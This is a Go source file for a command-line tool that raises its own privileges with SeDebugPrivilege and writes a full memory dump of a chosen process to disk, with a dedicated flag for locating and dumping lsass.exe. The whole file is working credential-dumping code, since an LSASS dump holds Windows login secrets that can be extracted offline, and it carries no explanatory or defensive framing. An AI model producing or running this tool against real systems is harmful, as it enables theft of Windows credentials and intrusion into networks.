package main

import (
	"flag"
	"fmt"
	"github.com/mitchellh/go-ps"
	"log"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

const targetProcess string = "lsass.exe"

func elevateProcessToken() error {

	//token elevation process sourced from
	//https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code

	type Luid struct {
		lowPart  uint32 // DWORD
		highPart int32  // long
	}
	type LuidAndAttributes struct {
		luid       Luid   // LUID
		attributes uint32 // DWORD
	}

	type TokenPrivileges struct {
		privilegeCount uint32 // DWORD
		privileges     [1]LuidAndAttributes
	}

	const SeDebugPrivilege = "SeDebugPrivilege"
	const tokenAdjustPrivileges = 0x0020
	const tokenQuery = 0x0008
	var hToken uintptr


	user32 := syscall.MustLoadDLL("user32")
	defer user32.Release()

	kernel32 := syscall.MustLoadDLL("kernel32")
	defer user32.Release()

	advapi32 := syscall.MustLoadDLL("advapi32")
	defer advapi32.Release()

	GetCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
	GetLastError := kernel32.MustFindProc("GetLastError")
	OpenProdcessToken := advapi32.MustFindProc("OpenProcessToken")
	LookupPrivilegeValue := advapi32.MustFindProc("LookupPrivilegeValueW")
	AdjustTokenPrivileges := advapi32.MustFindProc("AdjustTokenPrivileges")

	currentProcess, _, _ := GetCurrentProcess.Call()

	result, _, err := OpenProdcessToken.Call(currentProcess, tokenAdjustPrivileges|tokenQuery, uintptr(unsafe.Pointer(&hToken)))
	if result != 1 {
		fmt.Println("OpenProcessToken(): ", result, " err: ", err)
		return err
	}

	var tkp TokenPrivileges

	result, _, err = LookupPrivilegeValue.Call(uintptr(0), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(SeDebugPrivilege))), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
	if result != 1 {
		fmt.Println("LookupPrivilegeValue(): ", result, " err: ", err)
		return err
	}

	const SePrivilegeEnabled uint32 = 0x00000002

	tkp.privilegeCount = 1
	tkp.privileges[0].attributes = SePrivilegeEnabled

	result, _, err = AdjustTokenPrivileges.Call(hToken, 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
	if result != 1 {
		fmt.Println("AdjustTokenPrivileges() ", result, " err: ", err)
		return err
	}

	result, _, _ = GetLastError.Call()
	if result != 0 {
		fmt.Println("GetLastError() ", result)
		return err
	}

	return nil
}

func processDump(pid int) {

	//set up Win32 APIs
	var dbghelp = syscall.NewLazyDLL("Dbghelp.dll")
	var procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
	var procOpenProcess = kernel32.NewProc("OpenProcess")
	var procCreateFileW = kernel32.NewProc("CreateFileW")

	process, err := os.FindProcess(pid)

	if err == nil {
		fmt.Printf("Process %d found \n", process.Pid)
	} else {
		fmt.Printf("Process %d not found \n", pid)
		os.Exit(1)
	}

	//make sure a handle on the process can be obtained
	processHandle, _, err := procOpenProcess.Call(uintptr(0xFFFF), uintptr(1), uintptr(pid))

	if processHandle != 0 {
		fmt.Println("Process Handle OK")
	} else {
		fmt.Println("Process Handle Error")
		fmt.Println(err)
		os.Exit(1)
	}

	currentDirectory, _ := os.Getwd()
	filePath := currentDirectory + "\\" + strconv.Itoa(pid) + ".dmp"

	os.Create(filePath)

	//get handle on newly created file
	path, _ := syscall.UTF16PtrFromString(filePath)
	fileHandle, _, err := procCreateFileW.Call(uintptr(unsafe.Pointer(path)), syscall.GENERIC_WRITE, syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE, 0, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)

	ret, _, err := procMiniDumpWriteDump.Call(uintptr(processHandle), uintptr(pid), uintptr(fileHandle), 0x00061907, 0, 0, 0)

	if ret != 0 {
		fmt.Println("Process memory dump successful to", filePath)
	} else {
		fmt.Println("Process memory dump not successful")
		fmt.Println(err)
		os.Remove(filePath)
	}

}

func main() {

	var pid int = 0

	lsassPtr := flag.Bool("l", false, "Extract LSASS")
	processPtr := flag.Int("p", 0, "PID to extract")

	flag.Parse()

	if *lsassPtr{
		pid = getLsassPid()
	} else if *processPtr != 0 {
		pid = *processPtr
	} else {
		fmt.Println("Must pass either LSASS or PID")
		os.Exit(1)
	}

	if pid == 0{
		fmt.Println("Invalid process")
		os.Exit(1)
	}

	//elevate the current process token
	err := elevateProcessToken()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	processDump(pid)

}

	func getLsassPid() int {

		var pid int

		processList, err := ps.Processes()
		if err != nil {
		log.Println("ps.Processes() Failed")
		return 0
	}
		for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() == targetProcess {
			pid = process.Pid()
		}
	}
		return pid
}